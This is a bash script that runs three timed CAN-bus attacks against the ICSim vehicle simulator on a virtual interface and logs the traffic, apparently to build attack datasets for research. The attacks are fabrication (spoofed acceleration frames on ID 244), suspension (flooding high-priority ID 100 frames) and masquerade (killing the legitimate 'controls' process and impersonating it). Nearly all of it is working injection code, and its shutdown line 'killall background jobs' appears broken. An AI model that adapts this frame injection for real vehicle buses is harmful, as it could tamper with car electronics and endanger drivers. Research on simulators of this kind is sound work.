#!/bin/bash
# Combined Attack Script: Fabrication, Suspension, and Masquerade on ICSim Acceleration
# Target CAN ID: 244 (used for acceleration in ICSim)
# Logs baseline data and executes sequential attacks with timing gaps.

echo "Starting Combined Attack on ICSim Acceleration (CAN ID: 244)..."

# Define the target CAN ID and fake data
TARGET_ID="244"
FAKE_DATA_FABRICATION="11223344"  # Fake acceleration data for Fabrication
HIGH_PRIORITY_ID="100"            # High-priority ID for Suspension Attack
FAKE_DATA_MASQUERADE="AABBCCDD"   # Fake acceleration data for Masquerade
LOG_FILE="attack_log.log"

# Function to start candump logging
start_logging() {
    echo "Starting CAN traffic logging to $LOG_FILE..."
    candump -L vcan0 > $LOG_FILE &
    LOG_PID=$!
}

# Function to stop logging
stop_logging() {
    echo "Stopping CAN traffic logging..."
    kill $LOG_PID
}

# Fabrication Attack
fabrication_attack() {
    while true; do
        cansend vcan0 ${TARGET_ID}#${FAKE_DATA_FABRICATION}
        sleep 0.5  # Increase sleep to create noticeable jumps
    done
}

# Suspension Attack
suspension_attack() {
    while true; do
        cansend vcan0 ${HIGH_PRIORITY_ID}#FFFFFFFF
        sleep 0.3  # Increase sleep for jump effect
    done
}

# Masquerade Attack
masquerade_attack() {
    # Stop legitimate 'controls' program
    sudo pkill -f controls
    sleep 1  # Allow time for shutdown
    while true; do
        cansend vcan0 ${TARGET_ID}#${FAKE_DATA_MASQUERADE}
        sleep 0.7  # Larger sleep for bigger jumps
    done
}

# Trap for clean shutdown
trap "echo 'Stopping all processes...'; stop_logging; killall background jobs; exit" INT

# Start CAN traffic logging
start_logging

# Step 1: Record baseline data for 1 minute
echo "Recording baseline data for 1 minute..."
sleep 60
echo "Baseline data recording complete."

# Step 2: Start Fabrication Attack for 30 seconds
echo "Starting Fabrication Attack..."
fabrication_attack &
FAB_PID=$!
sleep 30

# Step 3: Add Suspension Attack for another 30 seconds
echo "Adding Suspension Attack to Fabrication..."
suspension_attack &
SUSP_PID=$!
sleep 30

# Step 4: Add Masquerade Attack for another 30 seconds
echo "Adding Masquerade Attack to Fabrication and Suspension..."
masquerade_attack &
MASQ_PID=$!
sleep 30

# Stop all attacks and logging
echo "Stopping all attacks..."
kill $FAB_PID $SUSP_PID $MASQ_PID
stop_logging

echo "Combined attack complete. CAN traffic logged in $LOG_FILE."
